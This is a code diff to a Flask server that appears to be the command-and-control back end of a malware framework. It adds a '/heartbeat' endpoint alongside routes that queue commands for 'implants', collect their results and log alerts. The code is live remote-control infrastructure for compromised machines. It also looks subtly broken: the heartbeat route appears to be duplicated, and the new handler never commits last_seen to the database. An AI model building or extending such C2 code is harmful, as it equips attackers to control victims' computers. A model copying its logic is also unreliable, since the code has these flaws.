@@ -118,6 +118,27 @@ def get_next_command():
             return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
 
 
+@bp.route('/heartbeat', methods=['POST'])
+def heartbeat():
+    if request.method == 'POST':
+        try:
+            imp_id = request.json['computer_guid']
+            try:
+                implant = Implant.query.filter_by(computer_guid=imp_id).first()
+                if implant:
+                    now = datetime.now()
+                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+                    implant.last_seen = current_date_time
+                    return jsonify({"status": "keep Alive"})
+                else:
+                    return jsonify({"status": "register first"})
+            except Exception as e:
+                print(e)
+                return jsonify({"status": "register first"})
+
+        except Exception as e:
+            print(e)
+            return jsonify({"status": "register first"})
 
 @bp.route('/sendCommandResult', methods=['POST'])
 def store_command_results():
@@ -167,6 +188,7 @@ def heartbeat():
             return jsonify({"status": "register first"})
 
 
+
 @bp.route('/alert', methods=['POST'])
 def alert():
     if request.method == 'POST':
@@ -178,7 +200,7 @@ def alert():
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 alert = Alert(computer_guid=imp_id,
                               time_reported=current_date_time, alert=alert)
-                
+
                 db.session.commit()
                 return jsonify({"status": "Alert Registered"})
             except Exception as e:
